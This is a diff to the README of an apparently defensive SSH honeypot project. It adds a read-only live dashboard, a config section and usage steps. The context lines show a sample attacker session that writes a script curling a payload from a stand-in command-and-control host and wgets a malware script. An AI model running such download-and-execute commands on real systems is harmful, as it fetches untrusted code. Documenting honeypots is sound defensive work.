@@ -86,6 +86,7 @@ Unlike traditional honeypots that either run high-risk real virtual machines (pr
 | **`aegis-collector`** | `crates/aegis-collector` | High-throughput telemetry pipeline, JSON log aggregator, and `.cast` session recorder. |
 | **`aegis-ebpf`** | `crates/aegis-ebpf` | Aya-powered eBPF probe loader and ring buffer telemetry consumer. |
 | **`aegis-common`** | `crates/aegis-common` | Shared data schemas, event definitions, and configuration structs. |
+| **`aegis-dashboard`** | `crates/aegis-dashboard` | Read-only web UI: tails `attacks.json` and serves a live stats + feed dashboard. |
 
 ---
 
@@ -131,6 +132,16 @@ root@ubuntu-server-01:~# echo '#!/bin/bash\ncurl http://c2.example.com/payload.b
 root@ubuntu-server-01:~# wget http://example.com/malware.sh
 root@ubuntu-server-01:~# exit
 ```
+
+### 4. Watch It Live
+
+In a third terminal, start the dashboard (a separate, unprivileged process — it only reads `attacks.json`, never touches the sandbox or attacker traffic):
+
+```bash
+./target/release/aegis-dashboard deploy/config.toml
+```
+
+Open **http://127.0.0.1:8080** for live stats, top credentials/commands, an hourly activity chart, and a live event feed. It binds to loopback only by default — see the `[dashboard]` section in Configuration below to expose it elsewhere (it has no authentication, so only do this on a trusted network).
 
 ---
 
@@ -201,6 +212,10 @@ string_min_len = 6
 [logging]
 level = "info"
 json = false
+
+[dashboard]
+bind_addr = "127.0.0.1"   # Loopback by default — the dashboard has no auth
+port = 8080
 ```
 
 **Why a persistent host key matters:** a returning attacker (or a scanner like Shodan/Censys) that sees a *different* SSH host key on every connection has effectively fingerprinted you as a honeypot that restarts per-session. `host_key_path` is generated once and reused across restarts; omit it only if you specifically want a fresh ephemeral key every run.
